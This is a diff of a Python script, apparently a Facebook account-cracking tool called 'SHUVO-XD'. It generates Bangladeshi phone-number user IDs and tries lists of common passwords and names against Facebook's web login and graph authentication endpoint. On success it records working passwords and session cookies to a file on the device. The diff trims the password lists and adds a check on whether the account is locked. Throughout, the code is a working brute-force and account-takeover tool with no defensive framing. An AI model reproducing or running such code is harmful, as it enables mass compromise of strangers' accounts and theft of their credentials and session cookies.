@@ -491,8 +491,8 @@ def ___bd1___():
         print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
         for love in user:
             ids = code+love
-            if pasxd in ['1','01']:passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
-            elif pasxd in ['2','02']:passlist = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
+            if pasxd in ['1','01']:passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
+            elif pasxd in ['2','02']:passlist = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','ayesha','Bangladesh','jannat']
             ___x___.submit(___HOST___,ids,passlist,tl,ck)
     print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
 #-----------------------❲ RANDOM BD API ❳-----------------------#
@@ -511,8 +511,8 @@ def ___bd2___():
         print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
         for love in user:
             ids = code+love
-            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
-            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
+            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
+            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','ayesha','Bangladesh','jannat']
             __bal__.submit(___API___,ids,pwx,tl)
     print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
 #-----------------------❲ RANDOM INDIA ❳-----------------------#
@@ -603,7 +603,7 @@ def ___HOST___(ids,passlist,tl,ck):
         for pas in passlist:
             free_fb = session.get('https://free.facebook.com').text
             info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
-            update={'User-Agent': generate_random_user_agent(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
+            update={'User-Agent': ___sex___(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
             session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -638,59 +638,102 @@ def ___HOST___(ids,passlist,tl,ck):
     except Exception as e:
         pass
 #-----------------------❲ RANDOM METHOD API ❳-----------------------#
-def ___API___(ids,pwv,tl):
-    global loop,oks,cps
-    sys.stdout.write(f"\r{xd} SHUVO-XD {loop}{G}|{W}{len(oks)} ");sys.stdout.flush()
+import requests
+import sys
+import uuid
+import random
+import re
+
+# Assuming these are defined somewhere in your code
+# xd = ...
+# G = ...
+# W = ...
+# oks = []
+# loop = 0
+
+def generate_random_user_agent():
+    # Dummy implementation, you need to define this function
+    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+
+def linex():
+    # Dummy implementation, you need to define this function
+    pass
+
+def ___API___(ids, pwv, tl):
+    global loop, oks, cps
+    sys.stdout.write(f"\r{xd} SHUVO-XD {loop}{G}|{W}{len(oks)} ")
+    sys.stdout.flush()
+    
+    def lock(uid):
+        try:
+            req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
+            if 'Photoshop' in req:
+                return 'Active'
+            else:
+                return 'Locked'
+        except Exception as e:
+            return f'Error: {e}'
+
     try:
         for pas in pwv:
             adid = str(uuid.uuid4())
-            data={'adid': str(uuid.uuid4()),
-                    'format': 'json',
-                    'device_id': str(uuid.uuid4()),
-                    'email': ids,
-                    'password': pas,
-                    'generate_analytics_claims': '1',
-                    'community_id': '',
-                    'cpl': 'true',
-                    'try_num': '1',
-                    'family_device_id': str(uuid.uuid4()),
-                    'credentials_type': 'password',
-                    'source': 'login',
-                    'error_detail_type': 'button_with_disabled',
-                    'enroll_misauth': 'false',
-                    'generate_session_cookies': '1',
-                    'generate_machine_id': '1',
-                    'currently_logged_in_userid': '0',
-                    'locale': 'en_GB',
-                    'client_country_code': 'GB',
-                    'fb_api_req_friendly_name': 'authenticate'}
-            head={'User-Agent': generate_random_user_agent(),
-                    'Accept-Encoding':  'gzip, deflate',
-                    'Accept': '*/*',
-                    'Connection': 'keep-alive',
-                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                    'X-FB-Friendly-Name': 'authenticate',
-                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
-                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-Connection-Type': 'unknown',
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'X-FB-HTTP-Engine': 'Liger'}  
-            po = requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
+            data = {
+                'adid': adid,
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'email': ids,
+                'password': pas,
+                'generate_analytics_claims': '1',
+                'community_id': '',
+                'cpl': 'true',
+                'try_num': '1',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'password',
+                'source': 'login',
+                'error_detail_type': 'button_with_disabled',
+                'enroll_misauth': 'false',
+                'generate_session_cookies': '1',
+                'generate_machine_id': '1',
+                'currently_logged_in_userid': '0',
+                'locale': 'en_GB',
+                'client_country_code': 'GB',
+                'fb_api_req_friendly_name': 'authenticate'
+            }
+            head = {
+                'User-Agent': generate_random_user_agent(),
+                'Accept-Encoding': 'gzip, deflate',
+                'Accept': '*/*',
+                'Connection': 'keep-alive',
+                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'X-FB-Friendly-Name': 'authenticate',
+                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
+                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                'X-FB-Connection-Type': 'unknown',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-FB-HTTP-Engine': 'Liger'
+            }
+            po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head, allow_redirects=False).json()
             if 'access_token' in po:
-                coki = po["session_cookies"]
-                cok = {}
-                for x in coki:
-                    cok.update({x["name"]:x["value"]})
-                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
-                ids = re.findall('c_user=(.*);xs', kuki)[0]
-                print(f'\r{xd}{G} SHUVO-OK '+ids+' | '+pas+'\033[1;92m')
-                print(f'\r{xd} COOKIES '+kuki+'\x1b[38;5;223m');linex()
-                oks.append(ids)
-                open('/sdcard/SHUVO-RANDOM-OK.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
-                break
-            else:continue
-        loop+=1
+                status = lock(ids)
+                if "Active" in status:
+                    print("ok id")
+                    coki = po["session_cookies"]
+                    cok = {}
+                    for x in coki:
+                        cok.update({x["name"]: x["value"]})
+                    kuki = (";").join(["%s=%s" % (key, value) for key, value in cok.items()])
+                    ids = re.findall('c_user=(.*);xs', kuki)[0]
+                    print(f'\r{xd}{G} SHUVO-OK ' + ids + ' | ' + pas + '\033[1;92m')
+                    print(f'\r{xd} COOKIES ' + kuki + '\x1b[38;5;223m')
+                    linex()
+                    oks.append(ids)
+                    with open('/sdcard/SHUVO-RANDOM-OK.txt', 'a') as file:
+                        file.write(ids + '|' + pas + '|' + kuki + '\n')
+                    break
+            else:
+                continue
+        loop += 1
     except Exception as e:
         pass
 #-----------------------❲ END ❳-----------------------#
